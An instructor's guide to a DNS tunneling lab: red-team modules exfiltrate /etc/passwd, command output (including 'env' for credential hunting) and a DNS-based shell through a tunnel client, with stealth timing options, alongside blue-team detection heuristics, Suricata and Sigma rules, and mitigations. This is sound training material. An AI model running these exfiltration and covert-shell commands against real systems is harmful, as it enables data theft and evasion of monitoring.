# DNS Tunneling Lab – Instructor Walkthrough

> **Audience:** Cybersecurity professionals / students in an isolated lab environment  
> **Skill Level:** Intermediate (familiarity with DNS, networking, Python)  
> **MITRE ATT&CK:** T1071.004 – Application Layer Protocol: DNS  

---

## Table of Contents

1. [Theory & Background](#1-theory--background)
2. [Lab Architecture](#2-lab-architecture)
3. [Tool Inventory](#3-tool-inventory)
4. [Setup & Configuration](#4-setup--configuration)
5. [Module 1 – File Exfiltration Demo](#5-module-1--file-exfiltration)
6. [Module 2 – Command Output Exfiltration](#6-module-2--command-output-exfiltration)
7. [Module 3 – Simulated Reverse Shell](#7-module-3--simulated-reverse-shell)
8. [Module 4 – Blue Team Detection](#8-module-4--blue-team-detection)
9. [Packet-Level Analysis](#9-packet-level-analysis)
10. [Detection Rule Development](#10-detection-rule-development)
11. [Defenses & Mitigations](#11-defenses--mitigations)
12. [Lab Exercises](#12-lab-exercises)
13. [Troubleshooting](#13-troubleshooting)

---

## 1. Theory & Background

### What is DNS Tunneling?

DNS (Domain Name System) is one of the most universally allowed protocols — almost every network firewall permits DNS traffic on UDP port 53. DNS tunneling exploits this trust by **encoding arbitrary data inside DNS queries and responses**, using DNS as a covert communication channel rather than for legitimate name resolution.

```
Normal DNS:
  Client → "What is the IP of google.com?" → DNS Server → "142.250.80.46"

Tunneled DNS:
  Client → "DATA.sess01.3.10.6d616c77617265646174.tunnel.evil.com?" → Attacker DNS → "OK:3"
              └──────────────── exfil data ──────────────────┘
```

### Why it Works

| Factor | Explanation |
|--------|-------------|
| **Universal allowance** | Port 53/UDP is rarely blocked even in strict environments |
| **High query volume** | Normal networks produce thousands of DNS queries; tunneled traffic blends in |
| **Recursive resolvers** | Queries traverse multiple servers, obscuring origin |
| **No payload inspection** | Most firewalls permit DNS without deep content inspection |
| **TXT records designed for data** | TXT RRs were designed to carry arbitrary text |

### Encoding Strategy (This Lab)

```
Raw data → hex encode → split into ≤40-char labels → embed in FQDN

Example:
  /etc/passwd content (hex) → "726f6f743a783a303a30"
  Split → ["726f6f743a78", "3a303a30"]
  FQDN  → "DATA.sess01.0.10.726f6f743a78.3a303a30.tunnel.lab.local"
```

**Query anatomy:**
```
  <TYPE>.<SESSION>.<SEQ>.<TOTAL>.<DATA_CHUNK_1>.<DATA_CHUNK_N>.<DOMAIN>
     │       │       │     │         └────── hex-encoded data ────────┘
     │       │       │     └── total number of chunks
     │       │       └── sequence number (0-indexed)
     │       └── unique 8-char session identifier
     └── INIT | DATA | FIN | POLL
```

---

## 2. Lab Architecture

### Single-Machine (Loopback) – Recommended for Quick Start

```
┌─────────────────────────────────────────────────────────────────┐
│                     Single Lab Machine                          │
│                                                                 │
│  ┌──────────────────┐        ┌──────────────────────────────┐  │
│  │   dns_tunnel_    │        │     dns_tunnel_              │  │
│  │   client.py      │        │     server.py                │  │
│  │                  │──UDP──▶│                              │  │
│  │  Encodes data    │ :5353  │  Decodes + reassembles       │  │
│  │  into DNS labels │        │  Saves to exfiltrated_data/  │  │
│  └──────────────────┘        └──────────────────────────────┘  │
│           │                                │                    │
│           └──────────────────┬─────────────┘                    │
│                              ▼                                  │
│                 ┌───────────────────────┐                       │
│                 │  dns_tunnel_          │                       │
│                 │  analyzer.py          │                       │
│                 │                       │                       │
│                 │  Passive detection    │                       │
│                 └───────────────────────┘                       │
└─────────────────────────────────────────────────────────────────┘
                        lo (loopback)
```

### Two-VM Setup (Better for Realistic Demo)

```
  ┌─────────────────────────┐          ┌──────────────────────────┐
  │     VM-A  (Attacker)    │          │    VM-B  (C2 Server)     │
  │                         │          │                          │
  │  dns_tunnel_client.py   │──UDP 53─▶│  dns_tunnel_server.py   │
  │  dns_tunnel_analyzer.py │◀─────────│  (authoritative DNS)     │
  │                         │          │                          │
  │  IP: 192.168.56.101     │          │  IP: 192.168.56.100      │
  └─────────────────────────┘          └──────────────────────────┘
                          Host-Only Network
```

---

## 3. Tool Inventory

| File | Role | Team |
|------|------|------|
| `dns_tunnel_server.py` | Authoritative DNS server; decodes and reassembles tunneled data | Red (C2 infrastructure) |
| `dns_tunnel_client.py` | Encodes data into DNS queries and sends them | Red (attacker endpoint) |
| `dns_tunnel_analyzer.py` | Passive traffic analyzer with 6 detection heuristics | Blue (defender) |
| `lab_setup.sh` | Automated environment configuration | Both |
| `start_server.sh` | Generated launcher for the server | Red |
| `run_demo.sh` | Interactive demo menu | Red |
| `start_analyzer.sh` | Generated launcher for the analyzer | Blue |

---

## 4. Setup & Configuration

### Prerequisites

```bash
# Required
python3 --version          # 3.10+
sudo apt install tcpdump   # For packet capture

# Optional (live capture only)
pip install scapy
```

### Quick Setup (Single Machine)

```bash
cd dns_tunnel_lab/
chmod +x lab_setup.sh
./lab_setup.sh single
```

The setup script will:
- Create a Python virtual environment
- Install scapy (optional, for live capture)
- Generate all launcher scripts
- Run a connectivity self-test
- Print usage instructions

### Two-VM Setup

**On VM-B (Server/C2):**
```bash
./lab_setup.sh server
./start_server.sh          # Starts on port 53 (requires sudo)
```

**On VM-A (Client/Attacker):**
```bash
./lab_setup.sh client
# Edit run_demo.sh to point SERVER_IP to VM-B's IP
./run_demo.sh
```

### Custom Configuration

```bash
# Use non-privileged port (no sudo needed)
python3 dns_tunnel_server.py --domain tunnel.lab.local --port 5353

# Custom domain
python3 dns_tunnel_server.py --domain c2.lab.internal --port 53

# Client targeting custom server
python3 dns_tunnel_client.py \
    --server 192.168.56.100 \
    --port 5353 \
    --domain tunnel.lab.local \
    --mode exfil --file /etc/passwd
```

---

## 5. Module 1 – File Exfiltration

**Objective:** Demonstrate exfiltration of a sensitive file entirely via DNS.

### Step 1: Start the Server

```bash
# Terminal 1
python3 dns_tunnel_server.py \
    --domain tunnel.lab.local \
    --interface 0.0.0.0 \
    --port 5353 \
    --verbose
```

**Expected output:**
```
2024-01-15 10:00:01 [INFO] DNS Tunnel Server listening on 0.0.0.0:5353
2024-01-15 10:00:01 [INFO] Tunnel domain: tunnel.lab.local
2024-01-15 10:00:01 [INFO] Exfiltrated data → exfiltrated_data/
```

### Step 2: Exfiltrate /etc/passwd

```bash
# Terminal 2
python3 dns_tunnel_client.py \
    --server 127.0.0.1 \
    --port 5353 \
    --domain tunnel.lab.local \
    --mode exfil \
    --file /etc/passwd \
    --verbose
```

**Watch the client output:**
```
[INFO] Exfiltrating: /etc/passwd (2847 bytes)
[INFO] Initializing session: a3f7b2c1
[INFO] Session established. Server ACK: ACK:a3f7b2c1:1705312801
[INFO] Sending 2847 bytes in 18 DNS chunks (~160 bytes/chunk)
[DEBUG] [1/18] DATA fqdn=DATA.a3f7b2c1.0.18.726f6f743a783a30...tunnel.lab.local
[DEBUG] [2/18] DATA fqdn=DATA.a3f7b2c1.1.18.3a303a726f6f743a...tunnel.lab.local
...
[INFO] All chunks sent successfully.
```

**Watch the server output:**
```
[NEW SESSION] id=a3f7b2c1 client=127.0.0.1 hostname=lab-machine user=analyst
[EXFIL SAVED] session=a3f7b2c1 bytes=2847 sha256=9a3f2b1c…
  → exfiltrated_data/a3f7b2c1/
```

### Step 3: Verify Exfiltrated Data

```bash
ls -la exfiltrated_data/a3f7b2c1/
# raw.bin      – binary reassembled data
# data.txt     – UTF-8 decoded text
# summary.json – session metadata

cat exfiltrated_data/a3f7b2c1/summary.json
```

```json
{
  "session_id": "a3f7b2c1",
  "client": "127.0.0.1:54234",
  "metadata": {
    "mode": "file",
    "filename": "passwd",
    "hostname": "lab-machine",
    "user": "analyst"
  },
  "chunks": 18,
  "bytes": 2847,
  "sha256": "9a3f2b1c..."
}
```

### Teaching Points

- Each DNS query carries ~160 bytes of data (40 chars × 4 labels, hex-encoded = 80 bytes/label)
- A 2.8KB file requires ~18 queries — easily hidden in normal DNS traffic
- Sequence numbers enable out-of-order delivery and reassembly
- The server never initiates a connection — all traffic is client-initiated DNS queries

---

## 6. Module 2 – Command Output Exfiltration

**Objective:** Demonstrate C2-style command execution and output exfiltration.

```bash
# Exfiltrate system enumeration output
python3 dns_tunnel_client.py \
    --server 127.0.0.1 --port 5353 \
    --domain tunnel.lab.local \
    --mode cmd \
    --command "uname -a && id && cat /etc/os-release"
```

**Try these commands to demonstrate different scenarios:**

```bash
# Network enumeration
--command "ip addr show && ss -tlnp"

# User enumeration
--command "getent passwd | grep -v nologin"

# Process listing
--command "ps aux"

# Environment variables (credential hunting)
--command "env"
```

### Adjust timing for stealth

```bash
# Slow exfil (harder to detect by rate)
python3 dns_tunnel_client.py \
    --server 127.0.0.1 --port 5353 \
    --domain tunnel.lab.local \
    --mode cmd \
    --command "cat /etc/passwd" \
    --delay 2.0 \
    --jitter 0.5
```

---

## 7. Module 3 – Simulated Reverse Shell

**Objective:** Show how an attacker could maintain persistent access via DNS.

```bash
python3 dns_tunnel_client.py \
    --server 127.0.0.1 --port 5353 \
    --domain tunnel.lab.local \
    --mode shell
```

**Demo flow:**
```
[DNS Shell Demo]  Type commands to send their output.
Type 'exit' to quit.

cmd> whoami
[INFO] Running: whoami
[INFO] Sending 28 bytes in 1 DNS chunks
[INFO] All chunks sent successfully.

cmd> cat /etc/hostname
[INFO] Running: cat /etc/hostname
...
cmd> exit
```

### Discussion Points

- Each command output traverses as DNS queries — completely bypasses egress filtering
- The session persists as long as the domain is registered / resolves
- Traffic blends with normal recursive DNS noise
- Defenders see DNS queries, not TCP connections

---

## 8. Module 4 – Blue Team Detection

**Objective:** Demonstrate how to detect DNS tunneling using traffic analysis.

### Start the Analyzer (Before Running Client)

```bash
# Terminal 3 (Blue Team)
sudo python3 dns_tunnel_analyzer.py \
    --interface lo \
    --output-json logs/alerts.json
```

### Run the Client (simultaneously)

```bash
# Terminal 2 (Red Team)
python3 dns_tunnel_client.py \
    --server 127.0.0.1 --port 5353 \
    --domain tunnel.lab.local \
    --mode exfil --file /etc/passwd
```

### Expected Alerts

```
======================================================================
[10:15:32] [HIGH] High Entropy Subdomain | src=127.0.0.1 domain=tunnel.lab.local
  Evidence: {
    "label": "726f6f743a783a303a30",
    "entropy": 3.96,
    "threshold": 3.8,
    "fqdn": "DATA.a3f7b2c1.0.18.726f6f743a78..."
  }

[10:15:32] [MEDIUM] Abnormally Long FQDN | src=127.0.0.1 domain=tunnel.lab.local
  Evidence: {
    "fqdn_length": 143,
    "fqdn": "DATA.a3f7b2c1.0.18.726f6f743a78..."
  }

[10:15:32] [HIGH] Hex-Encoded Label | src=127.0.0.1 domain=tunnel.lab.local
  Evidence: {
    "label": "726f6f743a783a303a30",
    "pattern": "hex"
  }

[10:15:35] [HIGH] High Query Frequency | src=127.0.0.1 domain=tunnel.lab.local
  Evidence: {
    "queries_per_min": 32,
    "threshold": 30
  }
======================================================================
```

### Detection Summary

```
======================================================================
DETECTION SUMMARY
======================================================================
  CRITICAL (4): 0 alerts
  HIGH     (3): 12 alerts
  MEDIUM   (2): 4 alerts
  LOW      (1): 18 alerts

Total alerts : 34
Total sources: 1
Flagged IPs  : 127.0.0.1
======================================================================
```

### Six Detection Heuristics Explained

| # | Heuristic | Rationale | Alert Level |
|---|-----------|-----------|-------------|
| 1 | **Shannon Entropy > 3.8** | Encoded data is statistically random; domain labels are typically low-entropy | HIGH |
| 2 | **FQDN Length > 120 chars** | Legitimate domains rarely exceed 60-80 chars; data stuffing makes FQDNs long | MEDIUM/HIGH |
| 3 | **Hex/Base32 patterns** | Labels matching `[0-9a-f]{8+}` are almost certainly encoded data | HIGH |
| 4 | **Query rate > 30/min/src** | Legitimate hosts rarely burst DNS at high rates to one domain | HIGH |
| 5 | **Subdomain uniqueness > 80%** | Normal hosts reuse domain names; tunnels create a new unique query each time | HIGH |
| 6 | **TXT record queries** | DNS TXT queries are rare in normal browsing; tunnels use TXT for responses | LOW |

---

## 9. Packet-Level Analysis

### Capture Traffic

```bash
# Capture DNS tunnel traffic
sudo tcpdump -i lo -w captures/tunnel.pcap "udp port 5353"

# Run demo in background, then stop capture
```

### Wireshark Analysis

Open the pcap in Wireshark and apply these filters:

```
# Show all DNS
dns

# Find long FQDNs (length > 100 chars)
dns.qry.name matches ".{100,}"

# Find hex-looking labels
dns.qry.name matches "[0-9a-f]{8,}"

# Show only TXT queries
dns.qry.type == 16

# Show queries to our tunnel domain
dns.qry.name contains "tunnel.lab.local"
```

### tshark One-Liners

```bash
# Extract all queried FQDNs sorted by length
tshark -r captures/tunnel.pcap -T fields -e dns.qry.name \
    | sort -t'|' -k1 -n | uniq

# Count queries per source IP
tshark -r captures/tunnel.pcap -q -z "ip_hosts,tree" 2>/dev/null

# Extract and decode hex labels
tshark -r captures/tunnel.pcap -T fields -e dns.qry.name \
    | grep -oP '[0-9a-f]{16,}' | xxd -r -p | strings
```

### Manual FQDN Decode

```python
# Decode a captured tunnel query manually
import binascii

fqdn = "DATA.a3f7b2c1.0.18.726f6f743a783a303a30.tunnel.lab.local"
parts = fqdn.split(".")
data_labels = parts[4:-3]   # strip type/session/seq/total and domain
hex_data = "".join(data_labels)
decoded = bytes.fromhex(hex_data).decode("utf-8", errors="replace")
print(decoded)
# Output: root:x:0:0:...
```

---

## 10. Detection Rule Development

### Suricata / Snort Rules

```
# Alert on unusually long DNS queries
alert dns any any -> any 53 (msg:"DNS Tunnel - Long FQDN"; \
    dns.query; content:"."; \
    pcre:"/^.{120,}$/"; \
    classtype:policy-violation; sid:9000001; rev:1;)

# Alert on hex-pattern subdomains
alert dns any any -> any 53 (msg:"DNS Tunnel - Hex Encoded Label"; \
    dns.query; \
    pcre:"/[0-9a-f]{20,}\./i"; \
    threshold:type limit, track by_src, count 3, seconds 60; \
    classtype:policy-violation; sid:9000002; rev:1;)

# Alert on high-volume queries to single domain
alert dns any any -> any 53 (msg:"DNS Tunnel - High Query Rate"; \
    dns.query; \
    threshold:type threshold, track by_src, count 30, seconds 60; \
    classtype:policy-violation; sid:9000003; rev:1;)
```

### Elastic / ECS Query (Sigma)

```yaml
title: DNS Tunneling Indicators
status: experimental
description: Detects potential DNS tunneling based on query characteristics
logsource:
  category: dns
detection:
  selection_long_fqdn:
    dns.question.name|re: '.{120,}'
  selection_hex_label:
    dns.question.name|re: '[0-9a-f]{16,}\.'
  selection_txt_query:
    dns.question.type: 'TXT'
    dns.question.name|contains: '.'
  condition: 1 of selection_*
falsepositives:
  - DKIM/DMARC TXT records
  - Legitimate CDN traffic
level: medium
tags:
  - attack.exfiltration
  - attack.t1071.004
```

### Python-Based IOC Extractor

```python
#!/usr/bin/env python3
"""Extract IOCs from dns_tunnel_server log."""
import re
import json
import sys

SESSION_RE = re.compile(
    r"\[NEW SESSION\] id=(\S+) client=(\S+) hostname=(\S+) user=(\S+)"
)
EXFIL_RE = re.compile(
    r"\[EXFIL SAVED\] session=(\S+) bytes=(\d+) sha256=([0-9a-f]+)"
)

iocs = []
with open(sys.argv[1]) as f:
    for line in f:
        m = SESSION_RE.search(line)
        if m:
            iocs.append({"type": "session_init", "session": m.group(1),
                         "src_ip": m.group(2), "hostname": m.group(3),
                         "user": m.group(4)})
        m = EXFIL_RE.search(line)
        if m:
            iocs.append({"type": "exfil_complete", "session": m.group(1),
                         "bytes": int(m.group(2)), "sha256": m.group(3)})

print(json.dumps(iocs, indent=2))
```

---

## 11. Defenses & Mitigations

| Defense | Implementation | Effectiveness |
|---------|---------------|---------------|
| **DNS RPZ (Response Policy Zone)** | Block queries to known tunnel domains | HIGH for known domains |
| **FQDN length limits** | Drop queries > 100-120 chars at recursive resolver | HIGH |
| **Entropy scoring** | Flag subdomains with Shannon entropy > 3.5 | HIGH |
| **Rate limiting** | Block sources > 50 DNS queries/minute | MEDIUM |
| **DNS over HTTPS (DoH) monitoring** | Log and inspect DoH traffic | MEDIUM |
| **TXT record query alerting** | Alert on TXT queries to non-corporate domains | MEDIUM |
| **DNS inspection proxy** | Force all DNS through inspecting proxy | HIGH |
| **Behavioral baselining** | Alert on deviations from host's normal DNS volume | HIGH |
| **Blocklist feeds** | Known tunnel tool domains (iodine, dnscat2, etc.) | LOW (evasion-trivial) |

### Recursive Resolver Hardening

```bash
# BIND9 – Enable Response Rate Limiting (RRL)
# /etc/bind/named.conf.options
rate-limit {
    responses-per-second 10;
    referrals-per-second 5;
    nodata-per-second 5;
    nxdomains-per-second 5;
    slip 2;
};

# Restrict query name length (not natively in BIND, use iptables/nftables)
# Limit DNS UDP payload with iptables
iptables -A INPUT -p udp --dport 53 -m length --length 0:300 -j ACCEPT
iptables -A INPUT -p udp --dport 53 -j DROP
```

---

## 12. Lab Exercises

### Exercise 1 – Adjust and Evade (Red Team)
1. Run the base exfiltration demo
2. Reduce the delay to 0.01s — does the analyzer still detect it?
3. Increase the delay to 5s with jitter — does the rate threshold trigger?
4. Can you modify the client to use base32 encoding instead of hex?

### Exercise 2 – Tune Detection (Blue Team)
1. Lower the entropy threshold to 3.5 — what changes?
2. Raise the rate threshold to 60 — what attacks would evade it?
3. Add a detection rule for labels > 35 characters
4. Write a Suricata rule matching this lab's exact query format

### Exercise 3 – Packet Analysis
1. Capture a tunnel session with tcpdump
2. Open in Wireshark and manually identify all session chunks
3. Manually reassemble the exfiltrated data from the pcap
4. Compare to the server's saved output in `exfiltrated_data/`

### Exercise 4 – SIEM Integration
1. Export the analyzer's JSON alerts
2. Create a Splunk/Elastic detection using the alert fields
3. Build a dashboard showing: alerts by technique, top flagged IPs, alert timeline

### Exercise 5 – Compare with Real Tools
1. Install `iodine` or `dnscat2` in the lab
2. Run the same detection rules against them
3. Compare their evasion characteristics to this demo tool

---

## 13. Troubleshooting

### Server Not Receiving Queries

```bash
# Verify port is open
ss -ulnp | grep 5353

# Test with dig
dig @127.0.0.1 -p 5353 test.tunnel.lab.local TXT

# Check firewall
sudo ufw status
sudo iptables -L INPUT -n | grep 5353
```

### Client Not Connecting

```bash
# Verify server is running
python3 -c "
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.settimeout(2)
s.sendto(b'test', ('127.0.0.1', 5353))
print('reachable')
"

# Use verbose mode to see exact queries being sent
python3 dns_tunnel_client.py ... --verbose
```

### Scapy Live Capture Not Working

```bash
# Install / reinstall
pip install scapy --upgrade

# Check permissions (requires root for raw sockets)
sudo python3 dns_tunnel_analyzer.py --interface lo

# Fall back to pcap mode
sudo tcpdump -i lo -w /tmp/cap.pcap "udp port 5353"
python3 dns_tunnel_analyzer.py --pcap /tmp/cap.pcap
```

### Port 53 Requires Root

```bash
# Option 1: Use port 5353 (no root needed)
python3 dns_tunnel_server.py --port 5353
python3 dns_tunnel_client.py --port 5353

# Option 2: Use authbind
sudo apt install authbind
touch /etc/authbind/byport/53
chmod 500 /etc/authbind/byport/53
authbind --deep python3 dns_tunnel_server.py --port 53

# Option 3: CAP_NET_BIND_SERVICE
sudo setcap 'cap_net_bind_service=+ep' /usr/bin/python3
```

---

## References & Further Reading

- [MITRE ATT&CK T1071.004](https://attack.mitre.org/techniques/T1071/004/) – Application Layer Protocol: DNS
- [RFC 1035](https://datatracker.ietf.org/doc/html/rfc1035) – DNS Protocol Specification
- [SANS ISC – Detecting DNS Tunneling](https://isc.sans.edu/diary/Detecting+DNS+Tunneling/19621)
- iodine – Linux DNS tunnel tool (reference implementation)
- dnscat2 – C2 over DNS (reference implementation)
- CISA Advisory AA20-304A – DNS Infrastructure Tampering

---

*Lab developed for training in isolated environments. Do not deploy on production networks.*
